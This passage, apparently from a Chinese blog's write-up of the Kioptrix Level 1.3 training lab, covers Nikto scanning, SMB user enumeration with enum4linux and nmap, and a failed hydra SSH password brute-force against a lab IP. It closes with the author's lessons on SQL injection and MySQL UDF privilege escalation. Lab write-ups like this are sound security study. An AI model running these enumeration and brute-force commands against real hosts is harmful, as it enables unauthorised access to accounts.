<p>具体可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liver100day/article/details/121392509?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=nikto%E5%91%BD%E4%BB%A4&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-121392509.142%5Ev94%5Einsert_down1&amp;spm=1018.2226.3001.4187">Web漏洞扫描神器Nikto使用指南</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44257023/article/details/120932630?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169556019516800211521730%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169556019516800211521730&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120932630-null-null.142%5Ev94%5Einsert_down1&amp;utm_term=%E4%BB%80%E4%B9%88%E6%98%AFnikto&amp;spm=1018.2226.3001.4187">Kali-扫描工具-Nikto使用</a></p>
<h2 id="SMB-枚举"><a href="#SMB-枚举" class="headerlink" title="SMB-枚举"></a>SMB  枚举</h2>
<p>这里又发现一个新姿势</p>
<p>根据端口信息发现存在 SMB 服务，使用 enum4linux 对其进行枚举：<code>enum4linux 192.168.17.145</code></p>
<p>![image-20230924210740235](kioptrix_level 1.3/image-20230924210740235.png)</p>
<p>很神奇，直接发现了三个用户</p>
<p>未获取到 smb 版本号，但枚举出用户名：root、robert、john、loneferret</p>
<p>你以为就这样结束了？</p>
<p>用户名也可通过 nmap 进行枚举：<code>nmap -T4 --script=smb-enum-users 192.168.17.145</code></p>
<p>![image-20230924210912765](kioptrix_level 1.3/image-20230924210912765.png)</p>
<p>接着佬又执行如下操作</p>
<p>尝试对四个账户进行 ssh 暴破： <code>hydra -L u.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt 192.168.146.132 ssh</code></p>
<p>暴破失败，此思路仅供参考。</p>
<p>还有一点，便是在此之前的sql注入漏洞中，我们尝试在用户名或者密码处添加单引号会发现页面会有报错信息，这时候就应该极度注意了，但我却没有┭┮﹏┭┮</p>
<h1>0x05 文章总结</h1>
<p>总的来说，在此次靶场中思路依旧用上一个靶场，框架并没发生大的改变，但令我印象深刻的有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. 各种工具的使用（都未见过）比如nikto漏扫，SMB服务枚举处用户名，甚至nmap也可以枚举，唉还是太菜，什么都不知道，接着浅浅了解了一下hydra的ssh密码爆破<br><br>2. 这里便是网站的手工漏洞判断了，这次给我的教训有，一定一定要关注任何登录框，因为他极有可能存在sql注入，倘若没有发现，那大概率也是因为我菜不会判断，而这次的sql漏洞中，明明我都手工测试的时候看到了页面的报错信息，但我却选择无视，其实这已经说明了存在sql注入。<br><br>3. 同时这也有在提示我，未来要学会去搭建配置属于自己的强大字典，不然就学会利用各种扫描工具来间接丰富字典内容。不过前者肯定更完美。<br><br>4. 最后便是一些提权类的内容，这令我有点头疼，但即使知识体系庞大，我也不可退缩，比如这次边了解到了，如何突破受限制的shell环境、以及mysql的udf提权。虽然本文未做介绍但我会记录一下学习的文章，在此之后进行学习。<br></code></pre></td></tr></table></figure>
<p>我将在下次靶场之前进一步学习udf提权以及逃逸restricted shell</p>
<h1>0x06 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127538/2716174">渗透技巧——如何逃逸Linux的受限制shell执行任意命令</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/197647.html">CTF靶场系列-Kioptrix全集</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaowenxu/p/16694080.html">[CTF靶场之Kioptrix: Level 1.3]</a></p>
<p><a target="_blank" rel="noopener" href="https://www.z0sen.me/archives/kioptrix-level-1-3">Kioptrix: Level 1.3</a>  --极度推荐</p>
<p><a target="_blank" rel="noopener" href="https://steflan-security.com/vulnhub-kioptrix-level-1-3-walkthrough/">VulnHub – Kioptrix：1.3 级演练</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/25/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%E4%BA%8C/">← 下一篇 权限提升学习</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/24/CVE-2021-3156-sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">CVE-2021-3156-sudo 提权漏洞复现 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 靶场信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.1.</span> <span class="toc-text">探测存活主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.3.</span> <span class="toc-text">web目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E6%89%AB%E6%8F%8F"><span class="toc-number">2.4.</span> <span class="toc-text">web网站指纹扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞发现及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.</span> <span class="toc-text">万能密码登录获取用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-udf-%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">mysql-udf 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%88%B0flag"><span class="toc-number">3.3.</span> <span class="toc-text">找到flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 靶场总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BAecho%E5%91%BD%E4%BB%A4%E6%8E%A2%E7%B4%A2"><span class="toc-number">4.1.</span> <span class="toc-text">靶场echo命令探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nikto%E6%BC%8F%E6%89%AB%E5%88%9D%E8%AF%86"><span class="toc-number">4.2.</span> <span class="toc-text">nikto漏扫初识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-%E6%9E%9A%E4%B8%BE"><span class="toc-number">4.3.</span> <span class="toc-text">SMB  枚举</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 文章总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>